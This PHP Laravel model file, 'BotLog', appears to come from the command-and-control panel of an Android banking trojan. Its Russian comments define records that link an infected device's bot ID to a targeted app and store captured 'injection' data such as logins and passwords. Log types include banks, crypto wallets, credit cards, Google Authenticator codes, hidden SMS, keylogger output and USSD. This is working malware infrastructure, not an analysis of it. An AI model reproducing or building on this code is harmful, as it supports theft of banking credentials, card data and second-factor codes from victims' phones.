<?php

namespace App\Models;

use Database\Factories\BotLogFactory;
use Eloquent;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Database\Eloquent\Relations\HasOne;
use Illuminate\Support\Carbon;

/**
 * App\Models\BotLog
 *
 * @property int $id
 * @property string $bot_id
 * @property string|null $application Название пакета приложения. Пример: org.app.name. Необязательный параметр
 * @property string $type Тип лога. Доступные типы: "banks", "crypt", "wallets", "shops", "credit_cards", "emails", "sms", "events", "googleauth", "hidesms", "keylogger", "mail", "otheraccounts", "phonenumber", "pushlist", "ussd"
 * @property array $log JSON массив с данными инжекта, в любом формате. {"login": "log", "password": "pass", ...}
 * @property Carbon|null $created_at
 * @property Carbon|null $updated_at
 * @property string|null $comment
 * @method static BotLogFactory factory(...$parameters)
 * @method static Builder|BotLog newModelQuery()
 * @method static Builder|BotLog newQuery()
 * @method static Builder|BotLog query()
 * @method static Builder|BotLog whereApplication($value)
 * @method static Builder|BotLog whereBotId($value)
 * @method static Builder|BotLog whereCreatedAt($value)
 * @method static Builder|BotLog whereId($value)
 * @method static Builder|BotLog whereLog($value)
 * @method static Builder|BotLog whereType($value)
 * @method static Builder|BotLog whereUpdatedAt($value)
 * @property int $telegram_accepted
 * @property-read Bot|null $bot
 * @property-read Injection|null $injection
 * @method static Builder|BotLog whereComment($value)
 * @method static Builder|BotLog whereTelegramAccepted($value)
 * @mixin Eloquent
 */
class BotLog extends Model
{
    use HasFactory;

    protected $casts = [
        "log" => "array",
    ];

    protected $fillable = [
        "id",
        "bot_id",
        "application",
        "type",
        "log",
        "comment",
        "created_at",
        "updated_at",
    ];

    public function injection(): HasOne
    {
        return $this->hasOne(Injection::class, "application", "application");
    }

    public function bot(): HasOne
    {
        return $this->hasOne(Bot::class, "id", "bot_id");
    }
}
